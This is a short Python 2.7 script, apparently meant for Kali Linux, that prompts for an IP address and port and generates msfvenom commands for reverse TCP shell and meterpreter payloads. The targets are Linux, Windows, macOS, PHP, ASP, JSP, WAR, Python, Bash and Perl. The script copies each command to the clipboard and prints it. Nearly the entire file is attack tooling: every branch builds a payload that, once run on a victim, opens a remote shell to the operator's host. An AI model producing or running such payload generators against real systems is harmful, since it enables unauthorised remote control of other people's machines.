#This script is intented to be working in Python 2.7 and extremely useful if you're using Kali Linux.
from pynput.keyboard import Key, Controller
import pyperclip, os

os.system("clear")

keyboard = Controller()
print("(!) This script allows you to rapidly generate Reverse TCP exploits via msfvenom.")
print("-" * 60)
ipAddress = raw_input("(?) What is your desired IP address? ")
print("-" * 60)
port = raw_input("(?) What is your desired Port? ")
print("-" * 60)

selector = ""

os.system("clear")

payloadType = raw_input("(?) Linux, Windows, Mac, PHP, ASP, JSP, WAR, Python, Bash, Perl? ")
payloadTypeNew = payloadType.lower()

if payloadTypeNew == "linux" or payloadTypeNew == "lin":
    pyperclip.copy("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f elf > payload.elf")
    print("(+) Linux Reverse Shell Generated!")
    selector = "linux"

elif payloadTypeNew == "windows" or payloadTypeNew == "win" or payloadTypeNew == "window":
    pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f exe > payload.exe")
    print("(+) Windows Reverse Shell Generated!")
    selector = "windows"

elif payloadTypeNew == "mac":
    pyperclip.copy("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f macho > payload.macho")
    print("(+) Mac Reverse Shell Generated!")
    selector = "mac"

elif payloadTypeNew == "php":
    pyperclip.copy("msfvenom -p php/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.php")
    print("(+) PHP Reverse Shell Generated!")
    selector = "php"

elif payloadTypeNew == "asp":
    pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f asp > payload.asp")
    print("(+) ASP Reverse Shell Generated!")
    selector = "asp"

elif payloadTypeNew == "jsp":
    pyperclip.copy("msfvenom -p jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.jsp")
    print("(+) JSP Reverse Shell Generated!")
    selector = "jsp"

elif payloadTypeNew == "war":
    pyperclip.copy("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f war > payload.war")
    print("(+) WAR Reverse Shell Generated!")
    selector = "war"

elif payloadTypeNew == "python" or payloadTypeNew == "py":
    pyperclip.copy("msfvenom -p cmd/unix/reverse_python LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.py")
    print("(+) Python Reverse Shell Generated!")
    selector = "python"

elif payloadTypeNew == "bash":
    pyperclip.copy("msfvenom -p cmd/unix/reverse_bash LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.sh")
    print("(+) Bash Reverse Shell Generated!")
    selector = "bash"

elif payloadTypeNew == "perl":
    pyperclip.copy("msfvenom -p cmd/unix/reverse_perl LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.pl")
    print("(+) Perl Reverse Shell Generated!")
    selector = "perl"

else:
    print("(-) Unrecognised file type, please try again!")

print("-" * 60)
print("(*) The following code was copied to your clipboard:")

if selector == "perl":
    print("(*) msfvenom -p cmd/unix/reverse_perl LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.pl")

elif selector == "bash":
    print("(*) msfvenom -p cmd/unix/reverse_bash LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.sh")

elif selector == "python":
    print("(*) msfvenom -p cmd/unix/reverse_python LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.py")

elif selector == "war":
    print("(*) msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f war > payload.war")

elif selector == "jsp":
    print("(*) msfvenom -p jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.jsp")

elif selector == "asp":
    print("(*) msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f asp > payload.asp")

elif selector == "php":
    print("(*) msfvenom -p php/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.php")

elif selector == "mac":
    print("(*) msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f macho > payload.macho")

elif selector == "windows":
    print("(*) msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f exe > payload.exe")

elif selector == "linux":
    print("(*) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f elf > payload.elf")

else:
    pass

print("")
print("")
raw_input("Press any button to continue...")